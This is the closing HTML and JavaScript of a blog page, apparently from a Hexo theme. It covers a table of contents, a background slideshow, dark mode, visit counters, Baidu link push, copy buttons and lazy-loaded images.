<script src="/js/tocbot/tocbot.min.js"></script>
<div class="toc"></div>

<script>
  if ($('.toc').length > 0) {
    var headerEl = 'h2, h3, h4',  //headers 
      content = '.post-detail',//文章容器
      idArr = {};  //标题数组以确定是否增加索引id
      //add #id

    $(content).children(headerEl).each(function () {
      //去除空格以及多余标点
      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');

      headerId = headerId.toLowerCase();
      if (idArr[headerId]) {
        //id已经存在
        $(this).attr('id', headerId + '-' + idArr[headerId]);
        idArr[headerId]++;
      }
      else {
        //id未存在
        idArr[headerId] = 1;
        $(this).attr('id', headerId);
      }
    });

    tocbot.init({
      // Where to render the table of contents.
      tocSelector: '.toc',
      // Where to grab the headings to build the table of contents.
      contentSelector: content,
      // Which headings to grab inside of the contentSelector element.
      headingSelector: headerEl,
      scrollSmooth: true,
      scrollSmoothOffset: -80,
      headingsOffset: -($(window).height() * 0.4 - 45),
      positionFixedSelector: '.toc-main',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  }

</script>

<style>
.is-position-fixed {
  position:sticky !important;
  top: 74px;
}
.toc-main ul {
  counter-reset: show-list;
}
.toc-main ul li::before {
  content: counter(item)".";
  display: block;
  position: absolute;
  left: 12px;
  top:0;
}
.toc > .toc-list {
  padding-left: 35px;
}
.toc>.toc-list li {
  list-style: decimal;
}
.toc-list {
  padding-left: 25px;
}
</style>
      </div>
    </div>
  </div>

  

  <script>
    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
    let open = eval('' || 'true');
    openOrCloseBtn.click(function() {
      if (open === true) {
        $(".toc-aside").css({'width': 0, 'padding': 0});
        $(".toc-content").css({'width': 0});
        $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
        $(".main-content").css({'width': '75%', 'margin': '10px auto'});
        open = false;
      } else {
        $(".toc-aside").css({'width': '300px', 'padding': '0 10px'});
        $(".toc-content").css({'width': '300px'});
        $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
        $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
        open = true;
      }
    });
  </script>


  <!-- 渲染issues标签里的内容 -->
  <script>
  function loadIssuesJS() {
    if ($(".post-detail").find(".issues-api").length == 0) return;
    document.write('<script type="text/javascript" src="/js/issues/index.js"><\/script>');
  };
  loadIssuesJS();
</script>

  <!-- 图片放大 Wrap images with fancybox support -->
  <script src="/js/wrapImage.js"></script>
</div>

<!-- 文章详情页背景图 -->
<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;" :style="{'background-color': bgColor ? bgColor : 'transparent'}">
    <transition-group tag="ul" :name="names">
        <li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
            <img :src="image" class="bg-swiper-img">
        </li>
    </transition-group>
</div>
<script>
    var vm = new Vue({
        el: '#appBgSwiper',
        data: {
            names: '' || 'fade' || 'fade', // translate-fade fade
            mark: 0,
            img: [],
            bgColor: '',
            time: null
        },
        methods: {   //添加方法
            change(i, m) {
                if (i > m) {
                    // this.names = 'fade';
                } else if (i < m) {
                    // this.names = 'fade';
                } else {
                    return;
                }
                this.mark = i;
            },
            prev() {
                // this.names = 'fade';
                this.mark--;
                if (this.mark === -1) {
                    this.mark = 3;
                    return
                }
            },
            next() {
                // this.names = 'fade';
                this.mark++;
                if (this.mark === this.img.length) {
                    this.mark = 0;
                    return
                }
            },
            autoPlay() {
                // this.names = 'fade';
                this.mark++;
                if (this.mark === this.img.length) {
                    this.mark = 0;
                    return
                }
            },
            play() {
                let bgImgDelay = '' || '180000'
                let delay = parseInt(bgImgDelay) || 180000;
                this.time = setInterval(this.autoPlay, delay);
            },
            enter() {
                clearInterval(this.time);
            },
            leave() {
                this.play();
            }
        },
        created() {
            this.play()
        },
        beforeDestroy() {
            clearInterval(this.time);
        },
        mounted() {
            let prop = ''|| '/medias/preview.jpg';
            let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://') 
            if (isImg) {
                let img = prop.split(',');
                let configRoot = '/'
                let arrImg = [];
                img.forEach(el => {
                    var Expression=/http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
			        var objExp = new RegExp(Expression);

                    if(objExp.test(el)) {
                        // http or https
                        arrImg.push(el);
                    } else {
                        // 非http or https开头
                        // 本地文件
                        let firstStr = el.charAt(0);
                        if (firstStr == '/') {
                            el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
                        }
                        el = configRoot + el;
                        arrImg.push(el);
                    }
                })
                this.img = arrImg;
            } else {
                this.bgColor = prop;
            }
        }
    })
</script>

<style>
    .bg-swiper-box {
        position: absolute;
        display: block;
        width: 100%;
        height: 100%;
    }
    .bg-swiper-img {
        object-fit: cover;
        width: 100%;
        height: 100%;
    }
</style>

    </main>

    <!-- 页脚 -->
    <div class="footer bg-color">
  <div class="footer-main">
    <div class="link">
      
    </div>
    <div class="footer-copyright">
      <p><a href="https://beacon-cai.github.io/">BEACON</a></p>

    </div>
    <div class="footer-custom">
      
    </div>
    <!-- 不蒜子统计 -->
    
      
  <!-- 不蒜子统计 -->
  <span id="busuanzi_container_site_pv">
        <i class="fa fa-book" aria-hidden="true"></i>Total reading：<span id="busuanzi_value_page_pv"></span> times
  </span>
  <span id="busuanzi_container_site_pv">
        <i class="fa fa-eye" aria-hidden="true"></i>Total visits：<span id="busuanzi_value_site_pv"></span> times
  </span>
  <span class="post-meta-divider">|</span>
  <span id="busuanzi_container_site_uv" style='display:none'>
        <i class="fa fa-users" aria-hidden="true"></i>Number of visitors：<span id="busuanzi_value_site_uv"></span> people
  </span>
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    
  </div>
</div>


    <!-- 渲染暗黑按钮 -->
    
      <div class="dark">
  <div class="dark-content">
    <i class="fa fa-moon-o" aria-hidden="true"></i>
    <!-- <span>关灯</span> -->
  </div>
  
</div>

<script>
  $(function() {
    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
    if (isDark) {
      $(".dark-content").replaceWith(
          `
          <div class='dark-content'>
            <i class="fa fa-lightbulb-o" aria-hidden="true"></i>
          </div>
          `
        );
    }
    $('.dark').click(function() {
      if ($(document.body).is('.darkModel')) {
        $(document.body).removeClass('darkModel');
        localStorage.setItem('dark', false);
        $(".dark-content").replaceWith(
          `
          <div class='dark-content'>
            <i class="fa fa-moon-o" aria-hidden="true"></i>
          </div>
          `
        );
      } else {
        $(document.body).addClass('darkModel');
        localStorage.setItem('dark', true);
        $(".dark-content").replaceWith(
          `
          <div class='dark-content'>
            <i class="fa fa-lightbulb-o" aria-hidden="true"></i>
          </div>
          `
        );
      }
    })
  })
</script>
    
    <!-- 渲染回到顶部按钮 -->
    
      <div class="goTop top-btn-color border-color">
  <i class="fa fa-arrow-up" aria-hidden="true"></i>
</div>
<script src="/js/goTop.js"></script>
    
    <!-- 渲染左下角音乐播放器 -->
    

    <!-- 图片放大 -->
    
      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
    
    
    <!-- 鼠标点击特效 -->
    <!-- 爱心点击 -->

	
		<script src="/js/cursor/fireworks.js"></script>
	



    <!-- 百度解析 -->
    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <!-- 背景彩带 -->
    <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
    
    <!-- div滚动到显示区域的动画 -->
    
    
    <!-- 复制提示 -->
    
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
  <div id="appCopy">
  </div>
  <script>
    var vm = new Vue({
      el: '#appCopy',
      data: {
      },
      computed: {
      },
      mounted() {
        const that = this;
        //  监听 ctrl + c事件  
        $(document).unbind('keypress').bind('keypress', function (e) {
          if (e.ctrlKey && e.keyCode == 67) {
            doSomething();
            // 返回false, 防止重复触发copy事件  
            return false;
          }
        })

        // 鼠标右键的复制事件  
        $(document).unbind('copy').bind('copy', function (e) {
          doSomething();
          // console.log('右键复制 监听成功');
        });

        function doSomething() {
          that.$notify({
            title: "复制成功！",
            content: "复制我的东西，就是我的人了！",
            type: 'success'
          })
          // console.log('ctrl + c 监听成功');  
        }
      },
      methods: {
      },
      created() { }
    })
  </script>


    <!-- 输入框打字特效 -->
    <!-- 输入框打字特效 -->

  <script src="/js/activate-power-mode.js"></script>
  <script>
    POWERMODE.colorful = true;  // 打开随机颜色特效
    POWERMODE.shake = false;    // 关闭输入框抖动
    document.body.addEventListener('input', POWERMODE);//监听打字事件
  </script>


    <!-- markdown代码一键复制功能 -->
    <!-- markdown代码一键复制功能 -->
<script src="/js/clipboard/clipboard.min.js"></script>
<script>
  !function (e, t, a) {
    var copy = 'copy';
    /* code */
    var initCopyCode = function () {
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
      copyHtml += '<i class="fa fa-copy"></i><span>' + copy + '</span>';
      copyHtml += '</button>';
      $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
      $(".post-detail pre").not('.gutter pre').before(copyHtml);
      new ClipboardJS('.btn-copy', {
        target: function (trigger) {
          return trigger.nextElementSibling;
        }
      });
    }
    initCopyCode();
  }(window, document);
</script>
    
    <!-- 图片懒加载 -->
    <script src="/js/lazyload/lazyload@1.9.1.js"></script>
<script>
  $(function () {
    $("div.lazyload, img.lazyload, a.lazyload").lazyload(
      {
        effect: "fadeIn",
        placeholder: "/medias/a95287c20385127f.gif"    //图片未加载出来时显示的占位图
      }
    );
  });
</script>
    
    <script src="/js/app.js"></script>

  </body>
</html>